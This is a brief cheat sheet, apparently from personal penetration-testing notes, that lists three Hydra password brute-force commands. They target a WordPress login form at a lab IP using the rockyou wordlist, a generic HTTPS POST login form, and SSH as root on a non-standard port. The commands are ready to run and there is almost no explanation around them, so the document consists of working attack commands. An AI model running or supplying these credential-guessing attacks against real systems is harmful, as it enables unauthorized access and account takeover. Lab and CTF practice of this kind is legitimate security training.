# hydra

## Hydra Usage

### Post attack

```csharp
hydra -l notch -P /usr/share/wordlists/rockyou.txt 10.10.10.37 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

### `Https POST`

```shell
hydra -L users -p PASSWORD <IP> https-post-form "/auth/login:module=auth&action=login&username=^USER^&password=^PASS^:Invalid" -fV  -e nsr 
```

### ssh on exotic port (5622 as an example)

```csharp
 hydra -s 5622 -l root -P /usr/share/seclists/Passwords/darkweb2017-top100.txt <IP> -t 4 -f ssh
```
